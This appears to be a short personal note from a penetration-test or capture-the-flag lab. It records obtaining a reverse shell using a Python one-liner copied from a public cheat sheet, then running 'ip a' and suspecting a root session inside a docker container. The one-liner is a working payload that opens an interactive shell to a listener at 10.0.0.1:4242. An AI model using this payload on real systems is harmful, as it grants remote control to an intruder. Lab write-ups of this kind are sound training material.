Finally managed to get a stable reverse shell from https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python

Using an interactive flag on `/bin/sh -i`
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```
![[Pasted image 20240905152305.png]]
![[Pasted image 20240905152318.png]]

```bash
ip a
```
![[Pasted image 20240905154048.png]]
It looks like we're in a docker container, as being root is strange

